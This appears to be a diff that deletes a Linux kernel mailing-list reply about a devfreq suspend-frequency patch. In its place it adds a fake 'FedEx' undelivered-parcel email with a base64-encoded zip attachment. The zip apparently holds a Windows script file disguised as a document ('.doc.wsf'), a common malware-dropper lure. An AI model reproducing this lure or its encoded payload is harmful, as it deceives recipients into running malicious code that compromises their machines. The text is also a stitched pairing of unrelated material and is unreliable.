@@ -1,127 +1,213 @@
-From: hl <hl@rock-chips.com>
-Subject: Re: [PATCH v1 1/2] PM/devfreq: add suspend frequency support
-Date: Tue, 1 Nov 2016 17:29:28 +0800
-Message-ID: <58186078.9010705@rock-chips.com>
-References: <1477990029-11062-1-git-send-email-hl@rock-chips.com>
- <1477990029-11062-2-git-send-email-hl@rock-chips.com>
- <CAGAzgsqHytozzHVwBWA5FK4YgTsyHd7-nERPAqSKH99XuVXUZA@mail.gmail.com>
+From: "FedEx 2Day A.M." <albert.harding-MbkTEkSc7m/beXlDLKSl0A@public.gmane.org>
+Subject: ROCK, We could not deliver your parcel, #00000137667
+Date: Tue, 1 Nov 2016 15:28:15 +0000
+Message-ID: <b4b983bdf887b42bc6504a3a9044cdd1@natureforge.com>
+Reply-To: "FedEx 2Day A.M." <albert.harding-MbkTEkSc7m/beXlDLKSl0A@public.gmane.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Type: multipart/mixed; boundary="b1_308d57c9c258e3acd57dced51890ee2d"
 Content-Transfer-Encoding: 8bit
-Return-path: <linux-pm-owner@vger.kernel.org>
-In-Reply-To: <CAGAzgsqHytozzHVwBWA5FK4YgTsyHd7-nERPAqSKH99XuVXUZA@mail.gmail.com>
-Sender: linux-pm-owner@vger.kernel.org
-To: "dbasehore ." <dbasehore@chromium.org>
-Cc: cw00.choi@samsung.com, Linux-pm mailing list <linux-pm@vger.kernel.org>, ??? <myungjoo.ham@samsung.com>, Doug Anderson <dianders@chromium.org>, linux-rockchip@lists.infradead.org
+Return-path: <linux-rockchip-bounces+glpar-linux-rockchip=m.gmane.org-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org>
+List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-rockchip>,
+ <mailto:linux-rockchip-request-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org?subject=unsubscribe>
+List-Archive: <http://lists.infradead.org/pipermail/linux-rockchip/>
+List-Post: <mailto:linux-rockchip-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org>
+List-Help: <mailto:linux-rockchip-request-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org?subject=help>
+List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-rockchip>,
+ <mailto:linux-rockchip-request-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org?subject=subscribe>
+Sender: "Linux-rockchip" <linux-rockchip-bounces-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org>
+Errors-To: linux-rockchip-bounces+glpar-linux-rockchip=m.gmane.org-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org
+To: linux-rockchip-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org
 List-Id: linux-rockchip.vger.kernel.org
 
-Hi Derek,
+--b1_308d57c9c258e3acd57dced51890ee2d
+Content-Type: text/plain; charset=us-ascii
 
-On 2016年11月01日 17:06, dbasehore . wrote:
-> On Tue, Nov 1, 2016 at 1:47 AM, Lin Huang <hl@rock-chips.com> wrote:
->> Add suspend frequency support and if needed set it to
->> the frequency obtained from the suspend opp (can be defined
->> using opp-v2 bindings and is optional).
->>
->> Change-Id: Iaa0d3848d63d9ce03f65ea76f263e4685a4c295e
->> Signed-off-by: Lin Huang <hl@rock-chips.com>
->> ---
->>   drivers/devfreq/devfreq.c | 17 ++++++++++++++++-
->>   include/linux/devfreq.h   |  9 +++++++++
->>   2 files changed, 25 insertions(+), 1 deletion(-)
->>
->> diff --git a/drivers/devfreq/devfreq.c b/drivers/devfreq/devfreq.c
->> index bf3ea76..d1152eb 100644
->> --- a/drivers/devfreq/devfreq.c
->> +++ b/drivers/devfreq/devfreq.c
->> @@ -364,7 +364,10 @@ void devfreq_monitor_suspend(struct devfreq *devfreq)
->>                  return;
->>          }
->>
->> -       devfreq_update_status(devfreq, devfreq->previous_freq);
->> +       if (devfreq->suspend_freq)
->> +               devfreq_update_status(devfreq, devfreq->suspend_freq);
->> +       else
->> +               devfreq_update_status(devfreq, devfreq->previous_freq);
->>          devfreq->stop_polling = true;
->>          mutex_unlock(&devfreq->lock);
->>          cancel_delayed_work_sync(&devfreq->work);
->> @@ -1251,6 +1254,18 @@ struct dev_pm_opp *devfreq_recommended_opp(struct device *dev,
->>   }
->>   EXPORT_SYMBOL(devfreq_recommended_opp);
->>
->> +void devfreq_opp_get_suspend_opp(struct device *dev, struct devfreq *devfreq)
->> +{
->> +       struct dev_pm_opp *suspend_opp;
->> +
->> +       rcu_read_lock();
->> +       suspend_opp = dev_pm_opp_get_suspend_opp(dev);
->> +       if (suspend_opp)
->> +               devfreq->suspend_freq = dev_pm_opp_get_freq(suspend_opp);
->> +       rcu_read_unlock();
->> +}
->> +EXPORT_SYMBOL(devfreq_opp_get_suspend_opp);
->> +
-> Instead of exporting a new function to do this, can it be done in the
-> devfreq_add_device function?
-Seems all the devfreq opp function export a new fucntion, to be consistent,
-i export devfreq_opp_get_suspend_opp().
->>   /**
->>    * devfreq_register_opp_notifier() - Helper function to get devfreq notified
->>    *                                for any changes in the OPP availability
->> diff --git a/include/linux/devfreq.h b/include/linux/devfreq.h
->> index 2de4e2e..c785ad9 100644
->> --- a/include/linux/devfreq.h
->> +++ b/include/linux/devfreq.h
->> @@ -88,6 +88,7 @@ struct devfreq_dev_status {
->>    */
->>   struct devfreq_dev_profile {
->>          unsigned long initial_freq;
->> +       unsigned long suspend_freq;
->>          unsigned int polling_ms;
->>
->>          int (*target)(struct device *dev, unsigned long *freq, u32 flags);
->> @@ -172,6 +173,7 @@ struct devfreq {
->>          struct delayed_work work;
->>
->>          unsigned long previous_freq;
->> +       unsigned long suspend_freq;
->>          struct devfreq_dev_status last_status;
->>
->>          void *data; /* private data for governors */
->> @@ -214,6 +216,8 @@ extern int devfreq_resume_device(struct devfreq *devfreq);
->>   /* Helper functions for devfreq user device driver with OPP. */
->>   extern struct dev_pm_opp *devfreq_recommended_opp(struct device *dev,
->>                                             unsigned long *freq, u32 flags);
->> +extern void devfreq_opp_get_suspend_opp(struct device *dev,
->> +                                       struct devfreq *devfreq);
->>   extern int devfreq_register_opp_notifier(struct device *dev,
->>                                           struct devfreq *devfreq);
->>   extern int devfreq_unregister_opp_notifier(struct device *dev,
->> @@ -348,6 +352,11 @@ static inline struct dev_pm_opp *devfreq_recommended_opp(struct device *dev,
->>          return ERR_PTR(-EINVAL);
->>   }
->>
->> +static inline void devfreq_opp_get_suspend_opp(struct device *dev,
->> +                                              struct devfreq *devfreq)
->> +{
->> +}
->> +
->>   static inline int devfreq_register_opp_notifier(struct device *dev,
->>                                           struct devfreq *devfreq)
->>   {
->> --
->> 2.6.6
->>
-> _______________________________________________
-> Linux-rockchip mailing list
-> Linux-rockchip@lists.infradead.org
-> http://lists.infradead.org/mailman/listinfo/linux-rockchip
->
->
->
+Dear Rock,
 
--- 
-Lin Huang
+Courier was unable to deliver the parcel to you.
+Shipment Label is attached to email.
+
+Yours faithfully,
+Albert Harding,
+Station Agent.
 
 
+--b1_308d57c9c258e3acd57dced51890ee2d
+Content-Type: application/zip; name="FedEx_ID_00000137667.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=FedEx_ID_00000137667.zip
+
+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
